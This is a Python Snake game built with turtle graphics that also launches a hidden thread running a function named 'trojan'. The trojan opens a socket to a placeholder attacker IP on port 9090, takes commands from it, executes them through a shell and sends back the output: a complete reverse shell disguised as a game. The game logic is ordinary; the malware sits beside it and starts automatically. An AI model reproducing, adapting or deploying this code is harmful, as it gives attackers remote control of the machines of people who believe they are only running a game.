from turtle import Turtle, Screen
import subprocess
import threading
import random
import socket
import time
import os

try:
    class Food(Turtle):
        def __init__(self):
            super().__init__()
            self.shape("circle")
            self.penup()
            self.shapesize(stretch_len=0.5, stretch_wid=0.5)
            self.color("blue")
            self.speed("fastest")
            self.refresh()

        def refresh(self):
            random_x = random.randint(-280, 280)
            random_y = random.randint(-280, 280)
            self.goto(random_x, random_y)

    class Snake:
        def __init__(self):
            self.STARTING_POSITIONS = [(0, 0), (-20, 0), (-40, 0)]
            self.MOVE_DISTANCE = 20

            self.UP = 90
            self.DOWN = 270
            self.LEFT = 180
            self.RIGHT = 0
            self.segments = []
            self.create_snake()
            self.head = self.segments[0]

        def create_snake(self):
            # Set Snake Body to Initial Position
            for position in self.STARTING_POSITIONS:
                self.add_segment(position)

        def add_segment(self, position):
            new_segment = Turtle("square")
            new_segment.color("white")
            new_segment.penup()
            new_segment.goto(position)
            self.segments.append(new_segment)

        def extend(self):
            # Adds new segment to snakes body
            self.add_segment(self.segments[-1].position())

        def move(self):
            for seg_num in range(len(self.segments) - 1, 0, -1):
                new_x = self.segments[seg_num - 1].xcor()
                new_y = self.segments[seg_num - 1].ycor()
                self.segments[seg_num].goto(new_x, new_y)
            self.head.forward(self.MOVE_DISTANCE)

        def reset(self):
            for seg in self.segments:
                seg.goto(1000, 1000)
            self.segments.clear()
            self.create_snake()
            self.head = self.segments[0]

        def up(self):
            if self.head.heading() != self.DOWN:
                self.head.setheading(self.UP)

        def down(self):
            if self.head.heading() != self.UP:
                self.head.setheading(self.DOWN)

        def left(self):
            if self.head.heading() != self.RIGHT:
                self.head.setheading(self.LEFT)

        def right(self):
            if self.head.heading() != self.LEFT:
                self.head.setheading(self.RIGHT)

    def trojan():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("ATTACKER IP ADDRESS", 9090)) # Change 'ATTACKER IP ADDRESS' Place holder

            app_cmds = ["notepad", "calc"]

            while True:
                command = s.recv(1024).decode()
                if command != "":
                    if len(command) >= 2 and command[0:2] == "cd":
                        try:
                            os.chdir(command[3:])
                            s.send("[+] Changed Directory Succesfully!".encode())
                        except:
                            s.send("[-] Directory Not Found!".encode())
                    elif command != "quit" and command not in app_cmds:
                        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        result = execute.stdout.read() + execute.stderr.read()
                        result = result.decode()
                        s.send(result.encode())
                    elif command in app_cmds:
                        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        s.send(f"[+] Executed {command} Succesfull!".encode())
                    else:
                        s.close()
                        break
                else:
                    s.send("Invalid Command".encode())
        except ConnectionAbortedError:
            quit()

    def game():
        screen = Screen()
        screen.setup(width=600, height=600)
        screen.bgcolor("black")
        screen.title("My Snake Game")
        screen.tracer(0)

        # Initialize Objects
        snake = Snake()
        food = Food()

        screen.listen()
        screen.onkey(snake.up, "Up")
        screen.onkey(snake.down, "Down")
        screen.onkey(snake.left, "Left")
        screen.onkey(snake.right, "Right")
        screen.onkey(fun=screen.bye, key="Escape")


        # Main Game Loop
        game_is_on = True
        while game_is_on:
            screen.update()
            time.sleep(0.1)
            snake.move()

        # Detect Collision
            # Detect Collision with Food
            if snake.head.distance(food) < 15:
                snake.extend()
                food.refresh()

            # Detect Collision with wall
            if snake.head.xcor() > 285 or snake.head.xcor() < -285 or snake.head.ycor() > 285 or snake.head.ycor() < -285:
                snake.reset()

            # Detect Collision with Tail
            for segment in snake.segments[1:]:
                if snake.head.distance(segment) < 10:
                    snake.reset()

        # Screen Exit when clicked
        screen.exitonclick()


    t1 = threading.Thread(target=game)
    t2 = threading.Thread(target=trojan)


    t1.start()
    t2.start()
except:
    quit()


